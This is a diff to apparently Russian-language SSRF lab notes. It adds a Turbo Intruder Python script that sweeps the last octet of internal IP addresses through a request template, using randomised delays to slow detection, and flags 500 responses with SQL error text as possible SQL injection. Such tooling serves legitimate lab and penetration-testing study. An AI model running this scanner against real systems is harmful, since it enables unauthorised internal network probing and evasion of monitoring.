@@ -91,3 +91,96 @@ GET /admin/delete?username=carlos HTTP/2
 - **Мониторинг необычных запросов** к внутренним сервисам
     
 - **Регулярное сканирование** на уязвимости SSRF
+
+
+
+
+
+
+скриптик
+
+
+
+
+
+```python
+import random
+
+import time
+
+try:
+
+    from urllib.parse import quote
+
+except ImportError:
+
+    from urllib import quote
+
+  
+
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+
+                          concurrentConnections=5,
+
+                          requestsPerConnection=100,
+
+                          pipeline=False)
+
+    requests = []
+
+    # Генерация диапазона IP-адресов (настраиваемо)
+
+    start_ip = 0    # Начало диапазона
+
+    end_ip = 255    # Конец диапазона
+
+    for i in range(start_ip, end_ip + 1):
+
+        # Формируем только последний октет IP
+
+        ip_octet = str(i)
+
+        # Вставляем в позицию %s в запросе
+
+        final_request = target.req.replace('%s', ip_octet)
+
+        requests.append(final_request)
+
+    min_delay = 100
+
+    max_delay = 500
+
+    for request in requests:
+
+        engine.queue(request)
+
+        if random.random() > 0.1:
+
+            delay = random.randint(min_delay, max_delay)
+
+            time.sleep(delay / 1000.0)
+
+  
+
+def handleResponse(req, interesting):
+
+    if interesting:
+
+        req.label = "INTER"
+
+        table.add(req)
+
+    elif req.status == 500:
+
+        response_text = req.response.lower()
+
+        sql_indicators = ['sql', 'syntax', 'mysql', 'database', 'error', 'exception', 'warning']
+
+        if any(indicator in response_text for indicator in sql_indicators):
+
+            req.label = "POTENTIAL SQLi"
+
+            table.add(req)
+```
